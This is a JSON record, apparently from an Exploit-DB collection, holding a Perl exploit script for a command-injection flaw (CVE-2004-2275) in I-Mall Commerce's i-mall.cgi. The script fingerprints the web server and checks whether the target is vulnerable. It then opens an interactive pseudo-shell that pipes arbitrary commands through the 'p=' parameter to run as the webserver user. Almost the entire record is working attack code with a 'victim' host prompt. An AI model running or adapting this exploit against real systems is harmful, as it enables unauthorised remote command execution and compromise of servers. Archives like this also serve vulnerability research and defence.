{
  "id": "980",
  "title": "I-Mall Commerce - &#039;i-mall.cgi&#039; Remote Command Execution",
  "cve": "CVE-2004-2275",
  "vuln_type": "rce",
  "code": "##############################################\r\n# I-Mall explo\r\n# Spawn bash style Shell with webserver uid\r\n# Greetz z\\, spax, foxtwo, Zone-H\r\n# This Script is currently under development\r\n##############################################\r\n\r\nuse strict;\r\nuse IO::Socket;\r\nmy $host;\t\t\r\nmy $port;\t\t\r\nmy $command;\t\t\r\nmy $url;\t\r\nmy $shiz;\t\t\r\nmy @results;\t\t\r\nmy $probe;\t\t\r\nmy @U;\t\t\t\r\n$U[1] = \"/i-mall/i-mall.cgi?p=|\";\r\n&intro;\r\n&scan;\r\n&choose;\r\n&command;\r\n&exit; \r\nsub intro {\r\n&help;\r\n&host;\r\n&server;\r\nsleep 1;\r\n};\r\nsub host {\r\nprint \"\\nHost or IP : \";\r\n$host=<STDIN>;\r\nchomp $host;\r\nif ($host eq \"\"){$host=\"127.0.0.1\"};\r\n$shiz = \"|\";\r\nprint \"\\nPort (enter to accept 80): \";\r\n$port=<STDIN>;\r\nchomp $port;\r\nif ($port =~/\\D/ ){$port=\"80\"};\r\nif ($port eq \"\" ) {$port = \"80\"};\r\n};\t\r\nsub server {\r\nmy $X;\r\nprint \"\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\";\r\n$probe = \"string\";\r\nmy $output;\r\nmy $webserver = \"something\";\r\n&connect;\r\nfor ($X=0; $X<=10; $X++){\r\n\t$output = $results[$X];\r\n\tif (defined $output){\r\n\tif ($output =~/apache/){ $webserver = \"apache\" };\r\n\t};\r\n};\r\nif ($webserver ne \"apache\"){\r\nmy $choice = \"y\";\r\nchomp $choice;\r\nif ($choice =~/N/i) {&exit};\r\n            }else{\r\nprint \"\\n\\nOK\";\r\n\t};\t\t\r\n};  \r\nsub scan {\r\nmy $status = \"not_vulnerable\";\r\nprint \"\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\";\r\nmy $loop;\r\nmy $output;\r\nmy $flag;\r\n$command=\"dir\";\r\nfor ($loop=1; $loop < @U; $loop++) { \r\n$flag = \"0\";\r\n$url = $U[$loop];\r\n$probe = \"scan\";\r\n&connect;\r\nforeach $output (@results){\r\nif ($output =~ /Directory/) {\r\n                              $flag = \"1\";\r\n\t\t\t      $status = \"vulnerable\";\r\n\t\t\t      };\r\n\t};\r\nif ($flag eq \"0\") { \r\n}else{\r\n     };\r\n};\r\nif ($status eq \"not_vulnerable\"){\r\n\r\n\t\t\t\t};\r\n}; \r\nsub choose {\r\n\r\nmy $choice=\"1\";\r\nchomp $choice;\r\nif ($choice > @U){ &choose };\r\nif ($choice =~/\\D/g ){ &choose };\r\nif ($choice == 0){ &other };\r\n$url = $U[$choice];\r\n}; \r\nsub other {\r\nmy $other = <STDIN>;\r\nchomp $other;\r\n$U[0] = $other;\r\n};  \r\nsub command {\r\nwhile ($command !~/quit/i) {\r\nprint \"[$host]\\$ \";\r\n$command = <STDIN>;\r\nchomp $command;\r\nif ($command =~/quit/i) { &exit };\r\nif ($command =~/url/i) { &choose }; \r\nif ($command =~/scan/i) { &scan };\r\nif ($command =~/help/i) { &help };\r\n$command =~ s/\\s/+/g; \r\n$probe = \"command\";\r\nif ($command !~/quit|url|scan|help/) {&connect};\r\n};\r\n&exit;\r\n};  \r\nsub connect {\r\nmy $connection = IO::Socket::INET->new (\r\n\t\t\t\tProto => \"tcp\",\r\n\t\t\t\tPeerAddr => \"$host\",\r\n\t\t\t\tPeerPort => \"$port\",\r\n\t\t\t\t) or die \"\\nSorry UNABLE TO CONNECT To $host On Port $port.\\n\";\r\n$connection -> autoflush(1);\r\nif ($probe =~/command|scan/){\r\nprint $connection \"GET $url$command$shiz HTTP/1.1\\r\\nHost: $host\\r\\n\\r\\n\";\r\n}elsif ($probe =~/string/) {\r\nprint $connection \"HEAD / HTTP/1.1\\r\\nHost: $host\\r\\n\\r\\n\";\r\n};\r\n\r\nwhile ( <$connection> ) { \r\n\t\t\t@results = <$connection>;\r\n\t\t\t };\r\nclose $connection;\r\nif ($probe eq \"command\"){ &output };\r\nif ($probe eq \"string\"){ &output };\r\n};  \r\nsub output{\r\nmy $display;\r\nif ($probe eq \"string\") {\r\n\t\t\tmy $X;\r\n\t\t\tfor ($X=0; $X<=10; $X++) {\r\n\t\t\t$display = $results[$X];\r\n\t\t\tif (defined $display){print \"$display\";};\r\n\t\t\t\t};\r\n\t\t\t}else{\r\n\t\t\tforeach $display (@results){\r\n\t\t\t    print \"$display\";\r\n\t\t\t\t};\r\n                          };\r\n};  \r\nsub exit{\r\nprint \"\\n\\n\\n ORP\";\r\nexit;\r\n};\r\nsub help {\r\nprint \"\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\";\r\nprint \"\\n\r\n        I-Mall E-Commerce Software i-mall.cgi \r\n        Command Execution Vulnerability by SPABAM 2004\" ;\r\nprint \"\\n http://www.zone-h.org/advisories/read/id=4904\r\n\";\r\nprint \"\\n I-Mall Exploit v0.99beta18\";\r\nprint \"\\n \\n note.. web directory is normally /var/www/html\";\r\nprint \"\\n\";\r\nprint \"\\n Host: www.victim.com or xxx.xxx.xxx.xxx (RETURN for 127.0.0.1)\";\r\nprint \"\\n Command: SCAN URL HELP QUIT\";\r\nprint \"\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\";\r\n};\r\n\r\n# milw0rm.com [2005-05-04]",
  "url": "https://www.exploit-db.com/exploits/980"
}